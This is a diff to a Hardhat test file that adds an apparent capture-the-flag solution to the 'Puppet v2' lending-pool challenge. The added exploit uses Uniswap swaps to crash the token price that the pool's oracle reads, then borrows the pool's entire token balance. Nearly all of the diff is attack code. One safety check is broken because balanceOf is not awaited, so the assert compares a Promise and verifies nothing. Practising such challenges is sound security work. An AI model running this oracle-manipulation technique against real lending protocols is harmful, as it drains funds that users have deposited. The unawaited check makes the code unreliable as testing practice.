@@ -3,7 +3,7 @@ const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
 const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");
 
 const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { expect, assert } = require('chai');
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, attacker;
@@ -80,8 +80,50 @@ describe('[Challenge] Puppet v2', function () {
         ).to.be.eq(ethers.utils.parseEther('300000'));
     });
 
+    /**Had to look part of this one up to get the full exploit just fyi, not completely organic **/
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const wethAttack = this.weth.connect(attacker);
+        const tokenAttack = this.token.connect(attacker);
+        const routerAttack = this.uniswapRouter.connect(attacker);
+        const lenderAttack = this.lendingPool.connect(attacker);
+
+
+        // Approve token transfer
+        await tokenAttack.approve(routerAttack.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        // Swap 10,000 DVT for WETH
+        await routerAttack.swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 
+            ethers.utils.parseEther("9"), 
+            [tokenAttack.address, wethAttack.address], 
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,   
+        )
+
+
+        // Calculate deposit required and approve the lending contract for that amount;
+        const deposit = await lenderAttack.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await wethAttack.approve(lenderAttack.address, deposit)
+
+        // Transfer remaining eth to weth (save some for gas) by sending to contract
+        const tx = {
+            to: wethAttack.address,
+            value: ethers.utils.parseEther("19.9")
+        }
+        await attacker.sendTransaction(tx);
+
+
+        // Verify we have enough WETH to make the deposit
+        const wethBalance = wethAttack.balanceOf(attacker.address);
+        assert(wethBalance >= deposit, "Not enough WETH to take all funds");
+
+        // Request borrow funds
+        await lenderAttack.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+            gasLimit: 1e6
+        });
+
+     
     });
 
     after(async function () {
